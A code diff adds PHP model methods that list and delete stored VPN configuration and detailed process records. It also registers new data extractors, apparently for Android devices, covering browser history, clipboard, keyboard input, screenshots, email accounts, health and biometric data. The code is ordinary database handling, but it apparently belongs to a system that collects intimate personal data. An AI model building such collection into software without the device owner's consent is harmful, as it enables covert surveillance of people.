+                foreach (['vpn_dns_servers', 'vpn_routes', 'vpn_apps', 'vpn_dns_search_domains', 'vpn_excluded_apps', 'vpn_included_apps'] as $key) {
+                    $r[$key] = is_string($r[$key] ?? null) ? json_decode($r[$key], true) : ($r[$key] ?? []);
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_vpn_config: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_vpn_config_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_vpn_config')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_vpn_config_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
+    /** Running Processes (detailed) */
+    public function get_count_RunningProcessesDetailed(int $user_id): int
+    {
+        return $this->getCount('tbl_running_processes_detailed', $user_id);
+    }
+
+    public function get_running_processes_detailed(int $user_id, int $perPage = 25): array
+    {
+        try {
+            $total = $this->get_count_RunningProcessesDetailed($user_id);
+            $page = service('request')->getGet('page') ?? 1;
+            $offset = ($page - 1) * $perPage;
+            $results = $this->fq('tbl_running_processes_detailed', $user_id)
+                ->orderBy('extracted_at', 'DESC')
+                ->limit($perPage, $offset)
+                ->get()->getResultArray();
+            foreach ($results as &$r) {
+                foreach (['groups', 'env_vars', 'wake_channels', 'open_files', 'memory_maps', 'stack_trace', 'capabilities_eff', 'capabilities_prm', 'capabilities_inh', 'capabilities_bnd', 'capabilities_amb'] as $key) {
+                    $r[$key] = is_string($r[$key] ?? null) ? json_decode($r[$key], true) : ($r[$key] ?? null);
+                }
+            }
+            unset($r);
+            $this->pager = \Config\Services::pager();
+            $this->pager->makeLinks($page, $perPage, $total, 'bootstrap5_full');
+            return $results;
+        } catch (\Exception $e) {
+            log_message('error', 'get_running_processes_detailed: ' . $e->getMessage());
+            return [];
+        }
+    }
+
+    public function delete_running_processes_detailed_row(int $id, int $userId): bool
+    {
+        try {
+            return (bool) $this->db->table('tbl_running_processes_detailed')->where('id', $id)->where('owner_id', $userId)->delete();
+        } catch (\Exception $e) {
+            log_message('error', 'delete_running_processes_detailed_row: ' . $e->getMessage());
+            return false;
+        }
+    }
+
     /**
      * Centralized Table Registry — maps every data table to its extractor category.
      * New extractors only need a new entry here to be included in unified delete/export.
@@ -5375,6 +6361,31 @@ try {
         'network_security'  => 'tbl_network_security',
         'telephony_network' => 'tbl_telephony_network',
         'system_locale'     => 'tbl_system_locale',
+
+        // Misc software detail extractors
+        'app_permissions'   => 'tbl_app_permissions',
+        'browser_history'   => 'tbl_browser_history',
+        'clipboard'         => 'tbl_clipboard',
+        'content_providers' => 'tbl_content_providers',
+        'crash_logs'        => 'tbl_crash_logs',
+        'digital_wellbeing' => ['tbl_digital_wellbeing', 'tbl_digital_wellbeing_apps'],
+        'doze_standby'      => ['tbl_doze_standby', 'tbl_doze_standby_apps'],
+        'email_accounts'    => 'tbl_email_accounts',
+        'health_data'       => 'tbl_health_data',
+        'keyboard_input'    => 'tbl_keyboard_input',
+        'keyguard_events'   => 'tbl_keyguard_events',
+        'screenshots'       => 'tbl_screenshots',
+        'screen_state'      => 'tbl_screen_state',
+        'vpn_config'        => 'tbl_vpn_config',
+        'running_processes_detailed' => 'tbl_running_processes_detailed',
+
+        // Misc hardware detail extractors
+        'audio_devices'     => ['tbl_audio_devices', 'tbl_audio_volumes'],
+        'biometric'         => 'tbl_biometric',
+        'gnss_hardware'     => 'tbl_gnss_hardware',
+        'power_rails'       => 'tbl_power_rails',
+        'usb_devices'       => 'tbl_usb_devices',
+        'vibration'         => 'tbl_vibration',
 
         // Composite extractors (data lives in existing tables, listed by destination)
         'apps_notifications' => [
